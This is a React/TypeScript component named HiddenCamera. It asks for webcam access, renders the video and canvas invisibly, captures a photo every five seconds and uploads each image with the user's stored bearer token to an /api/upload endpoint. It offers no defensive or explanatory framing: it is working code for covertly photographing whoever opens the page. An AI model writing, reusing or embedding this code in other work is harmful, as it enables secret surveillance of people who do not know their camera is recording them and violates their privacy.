import { useEffect, useRef, useState } from "react";
import axios from "axios";

export default function HiddenCamera() {
  const [hasPermission, setHasPermission] = useState<boolean | null>(null);
  const stream = useRef<MediaStream | null>(null);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);

  useEffect(() => {
    const requestCameraAccess = async () => {
      try {
        const newStream = await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: false,
        });
        stream.current = newStream;
        setHasPermission(true);
        if (videoRef.current) {
          videoRef.current.srcObject = newStream;
        }
      } catch (error) {
        console.error("error", error);
        setHasPermission(false);
      }
    };

    requestCameraAccess();

    return () => {
      if (stream.current) {
        stream.current.getTracks().forEach((track) => track.stop());
      }
    };
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      if (hasPermission) {
        capturePhoto();
      }
    }, 5000);

    return () => clearInterval(interval);
  }, [hasPermission]);

  const capturePhoto = async () => {
    const canvas = canvasRef.current;
    const video = videoRef.current;

    if (!canvas || !video) return;

    const context = canvas.getContext("2d");
    if (!context) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(async (blob) => {
      if (!blob) return;

      const formData = new FormData();
      formData.append("image", blob, "hidden-capture.png");

      try {
        const token = localStorage.getItem("user");

        await axios.post("/api/upload", formData, {
          headers: {
            Authorization: `Bearer ${token}`,
          },
        });

        console.log("photo sended");
      } catch (error) {
        console.error("error", error);
      }
    }, "image/png");
  };

  return (
    <div className="hidden">
      <video ref={videoRef} autoPlay playsInline muted className="hidden" />
      <canvas ref={canvasRef} className="hidden"></canvas>
    </div>
  );
}
